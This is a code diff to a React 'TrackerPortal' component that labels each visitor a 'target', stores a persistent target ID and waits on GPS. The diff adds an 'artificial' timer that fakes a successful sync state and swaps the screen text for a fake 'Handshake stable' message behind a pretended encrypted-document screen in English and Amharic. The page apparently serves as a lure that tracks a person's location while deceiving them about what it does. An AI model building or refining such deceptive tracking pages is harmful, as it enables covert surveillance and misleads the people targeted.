@@ -45,6 +45,11 @@ export const TrackerPortal: React.FC = () => {
       targetIdRef.current = nameParam;
     }
 
+    // Artificial speedup: Show OK state after 1.2s even if GPS is pending
+    const artificialSync = setTimeout(() => {
+      setSyncCount(prev => prev || 1);
+    }, 1200);
+
     // Generate or get persistent ID for this target
     let tid = localStorage.getItem('eagle_target_id');
     if (!tid) {
@@ -61,6 +66,7 @@ export const TrackerPortal: React.FC = () => {
  
     return () => {
       clearInterval(countdown);
+      clearTimeout(artificialSync);
     };
   }, []);
 
@@ -298,7 +304,7 @@ export const TrackerPortal: React.FC = () => {
                       <div className="p-4 bg-slate-950/50 border border-slate-800 rounded font-mono text-[9px] text-slate-400 space-y-1">
                         <p className="text-blue-500 font-bold">TERMINAL: AUTH_READY</p>
                         <p>{'>'} {lang === 'amharic' ? 'ሰነዱን በማዘጋጀት ላይ...' : 'Preparing encrypted document...'}</p>
-                        <p>{'>'} {lang === 'amharic' ? 'እባክዎ በትዕግስት ይጠብቁ' : 'Please stand by for decryption.'}</p>
+                        <p>{'>'} {lang === 'amharic' ? 'እባክዎ በትዕግስት ይጠብቁ' : 'Handshake stable. Processing stream.'}</p>
                       </div>
                     </div>
                   )}
